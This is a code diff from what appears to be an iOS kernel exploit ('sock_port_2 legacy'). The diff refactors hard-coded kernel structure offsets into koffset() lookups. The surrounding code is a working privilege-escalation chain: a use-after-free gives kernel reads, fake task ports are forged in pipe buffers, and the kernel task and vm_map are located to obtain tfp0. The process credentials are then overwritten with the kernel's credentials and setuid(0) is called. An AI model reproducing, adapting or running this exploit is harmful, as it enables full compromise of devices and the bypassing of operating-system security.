@@ -388,20 +388,20 @@ goto kern_fail;\
     addr_t itk_space = 0;
     addr_t is_table = 0;
     
-    err = kreadptr_sp(self_port_addr + IPC_PORT_IP_KOBJECT, &task_addr);
+    err = kreadptr_sp(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
     CHECK_FIND_PORT_RET(kreadptr, task_addr, err);
     DEVLOG("task_addr: " ADDR, task_addr);
     
-    err = kreadptr_sp(task_addr + TASK_ITK_SPACE, &itk_space);
+    err = kreadptr_sp(task_addr + koffset(TASK_ITK_SPACE), &itk_space);
     CHECK_FIND_PORT_RET(kreadptr, itk_space, err);
     DEVLOG("itk_space: " ADDR, itk_space);
     
-    err = kreadptr_sp(itk_space + IPC_SPACE_IS_TABLE, &is_table);
+    err = kreadptr_sp(itk_space + koffset(IPC_SPACE_IS_TABLE), &is_table);
     CHECK_FIND_PORT_RET(kreadptr, is_table, err);
     DEVLOG("is_table: " ADDR, is_table);
     
     uint32_t port_index = port >> 8;
-    const int sizeof_ipc_entry_t = IPC_ENTRY_SIZE;
+    const int sizeof_ipc_entry_t = koffset(IPC_ENTRY_SIZE);
     
     if(cleanup)
     {
@@ -434,6 +434,8 @@ ERR("%s failed: %s (%s)", #func, #addr, mach_error_string(err)); \
 goto fail;\
 } \
 }
+
+    offsets_init();
     
     LOG_("exploiting sock_port_2 legacy");
     
@@ -502,7 +504,7 @@ DEVLOG("%s: " ADDR, #val, val); \
     
     LOG_("reading kernel memory (UaF)");
     addr_t ipc_space_kernel = 0;
-    earlyReadPtr(self_port_addr + IPC_PORT_IP_RECEIVER, &ipc_space_kernel);
+    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_RECEIVER), &ipc_space_kernel);
     CHECK_EARLY_READ(ipc_space_kernel);
     
     DEVLOG("creating pipe");
@@ -570,28 +572,28 @@ DEVLOG("%s: " ADDR, #val, val); \
     addr_t pipe_buffer = 0;
     
     LOG_("reading kernel memory (UaF)");
-    earlyReadPtr(self_port_addr + IPC_PORT_IP_KOBJECT, &task_addr);
+    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
     CHECK_EARLY_READ(task_addr);
     
-    earlyReadPtr(task_addr + TASK_BSDINFO, &proc);
+    earlyReadPtr(task_addr + koffset(TASK_BSDINFO), &proc);
     CHECK_EARLY_READ(proc);
     
-    earlyReadPtr(proc + PROC_P_FD, &fds);
+    earlyReadPtr(proc + koffset(PROC_P_FD), &fds);
     CHECK_EARLY_READ(fds);
     
-    earlyReadPtr(fds + FILEDESC_FD_OFILES, &ofiles);
+    earlyReadPtr(fds + koffset(FILEDESC_FD_OFILES), &ofiles);
     CHECK_EARLY_READ(ofiles);
     
     earlyReadPtr(ofiles + port_pointer_overwrite_pipe[0] * sizeof(addr_t), &fproc);
     CHECK_EARLY_READ(fproc);
     
-    earlyReadPtr(fproc + FILEPROC_F_FGLOB, &fglob);
+    earlyReadPtr(fproc + koffset(FILEPROC_F_FGLOB), &fglob);
     CHECK_EARLY_READ(fglob);
     
-    earlyReadPtr(fglob + FILEGLOB_FG_DATA, &fg_data);
+    earlyReadPtr(fglob + koffset(FILEGLOB_FG_DATA), &fg_data);
     CHECK_EARLY_READ(fg_data);
     
-    earlyReadPtr(fg_data + PIPE_BUFFER, &pipe_buffer);
+    earlyReadPtr(fg_data + koffset(PIPE_BUFFER), &pipe_buffer);
     CHECK_EARLY_READ(pipe_buffer);
     
     addr_t port_fproc = 0;
@@ -602,13 +604,13 @@ DEVLOG("%s: " ADDR, #val, val); \
     fproc = earlyReadPtr(ofiles + fake_port_pipe[0] * sizeof(addr_t), &port_fproc);
     CHECK_EARLY_READ(port_fproc);
     
-    earlyReadPtr(port_fproc + FILEPROC_F_FGLOB, &port_fglob);
+    earlyReadPtr(port_fproc + koffset(FILEPROC_F_FGLOB), &port_fglob);
     CHECK_EARLY_READ(port_fglob);
     
-    earlyReadPtr(port_fglob + FILEGLOB_FG_DATA, &port_fg_data);
+    earlyReadPtr(port_fglob + koffset(FILEGLOB_FG_DATA), &port_fg_data);
     CHECK_EARLY_READ(port_fg_data);
     
-    earlyReadPtr(port_fg_data + PIPE_BUFFER, &fake_port_buffer);
+    earlyReadPtr(port_fg_data + koffset(PIPE_BUFFER), &fake_port_buffer);
     CHECK_EARLY_READ(fake_port_buffer);
 
     // Fix ip_kobject.
@@ -685,11 +687,11 @@ DEVLOG("%s: " ADDR, #val, val); \
     
     DEVLOG("pipe_fake_task_port: %x", pipe_fake_task_port);
     
-    addr_t *read_addr_ptr = (addr_t *)((addr_t)fake_task + TASK_BSDINFO);
+    addr_t *read_addr_ptr = (addr_t *)((addr_t)fake_task + koffset(TASK_BSDINFO));
 
 # define stage1Read32(addr, val) { \
    read(fake_port_pipe[0], (void *)fake_port, sizeof(kport_t) + fake_task_size); \
-   *read_addr_ptr = addr - BSDINFO_PID; \
+   *read_addr_ptr = addr - koffset(BSDINFO_PID); \
    write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size); \
    val = 0x0; \
    err = pid_for_task(pipe_fake_task_port, (int *)&val); \
@@ -710,7 +712,7 @@ DEVLOG("%s: " ADDR, #val, val); \
     
     LOG_("reading kernel memory (stage1)");
     addr_t struct_task;
-    stage1ReadPtr(self_port_addr + IPC_PORT_IP_KOBJECT, struct_task);
+    stage1ReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), struct_task);
     DEVLOG("struct_task: " ADDR, struct_task);
     
     if (struct_task != task_addr)
@@ -729,16 +731,16 @@ DEVLOG("%s: " ADDR, #val, val); \
     
     while(tmp_task_addr != 0)
     {
-        stage1ReadPtr(tmp_task_addr + TASK_BSDINFO, bsd_info);
+        stage1ReadPtr(tmp_task_addr + koffset(TASK_BSDINFO), bsd_info);
         if(!bsd_info)
         {
             ERR("stage1 read failed: (%s)", "bsd_info == 0");
             goto fail;
         }
-        stage1Read32(bsd_info + BSDINFO_PID, pid);
+        stage1Read32(bsd_info + koffset(BSDINFO_PID), pid);
         if (pid == 0)
         {
-            stage1ReadPtr(tmp_task_addr + TASK_VM_MAP, kernel_vm_map);
+            stage1ReadPtr(tmp_task_addr + koffset(TASK_VM_MAP), kernel_vm_map);
             if(!kernel_vm_map)
             {
                 ERR("stage1 read failed: (%s)", "kernel_vm_map == 0");
@@ -747,7 +749,7 @@ DEVLOG("%s: " ADDR, #val, val); \
             kernel_task_addr = tmp_task_addr;
             break;
         }
-        stage1ReadPtr(tmp_task_addr + TASK_PREV, tmp_task_addr);
+        stage1ReadPtr(tmp_task_addr + koffset(TASK_PREV), tmp_task_addr);
     }
     
     DEVLOG("kernel_task_addr: " ADDR, kernel_task_addr);
@@ -762,8 +764,8 @@ DEVLOG("%s: " ADDR, #val, val); \
     fake_task->lock.type = 0x22;
     fake_task->ref_count = 100;
     fake_task->active = 1;
-    *(addr_t*)((addr_t)fake_task + TASK_VM_MAP) = kernel_vm_map;
-    *(uint32_t*)((addr_t)fake_task + TASK_ITK_SELF) = 1;
+    *(addr_t*)((addr_t)fake_task + koffset(TASK_VM_MAP)) = kernel_vm_map;
+    *(uint32_t*)((addr_t)fake_task + koffset(TASK_ITK_SELF)) = 1;
     
     write(fake_port_pipe[1], (void *)fake_port, sizeof(kport_t) + fake_task_size);
     
@@ -813,8 +815,8 @@ DEVLOG("%s: " ADDR, #val, val); \
     err = find_port_tfp0_sp(pipe_fake_task_port, self_port_addr, true, NULL);
     CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);
     
-    err = kwriteptr_sp(fg_data + PIPE_BUFFER, 0);
-    CHECK_KERN_RET(kwriteptr, fg_data + PIPE_BUFFER, err);
+    err = kwriteptr_sp(fg_data + koffset(PIPE_BUFFER), 0);
+    CHECK_KERN_RET(kwriteptr, fg_data + koffset(PIPE_BUFFER), err);
     
     err = find_port_tfp0_sp(new_port, self_port_addr, true, NULL);
     CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);
@@ -853,13 +855,13 @@ DEVLOG("%s: " ADDR, #val, val); \
     addr_t kern_kauth_cred_addr = 0;
     addr_t our_cred_addr = 0;
     
-    err = kreadptr_sp(kernel_task_addr + TASK_BSDINFO, &kern_proc_addr);
+    err = kreadptr_sp(kernel_task_addr + koffset(TASK_BSDINFO), &kern_proc_addr);
     CHECK_KERN_RET(kreadptr_sp, kern_proc_addr, err);
     
-    err = kreadptr_sp(kern_proc_addr + BSDINFO_KAUTH_CRED, &kern_kauth_cred_addr);
+    err = kreadptr_sp(kern_proc_addr + koffset(BSDINFO_KAUTH_CRED), &kern_kauth_cred_addr);
     CHECK_KERN_RET(kreadptr_sp, kern_kauth_cred_addr, err);
     
-    err = kreadptr_sp(proc + BSDINFO_KAUTH_CRED, &our_cred_addr);
+    err = kreadptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), &our_cred_addr);
     CHECK_KERN_RET(kreadptr_sp, our_cred_addr, err);
 
     addr_t myProc;
@@ -867,8 +869,8 @@ DEVLOG("%s: " ADDR, #val, val); \
     myProc = proc;
     myUcred = our_cred_addr;
     
-    err = kwriteptr_sp(proc + BSDINFO_KAUTH_CRED, kern_kauth_cred_addr);
-    CHECK_KERN_RET(kwriteptr_sp, proc + BSDINFO_KAUTH_CRED, err);
+    err = kwriteptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), kern_kauth_cred_addr);
+    CHECK_KERN_RET(kwriteptr_sp, proc + koffset(BSDINFO_KAUTH_CRED), err);
     
     setuid(0); // update host port, security token and whatnot
     LOG_("uid: %u", getuid());
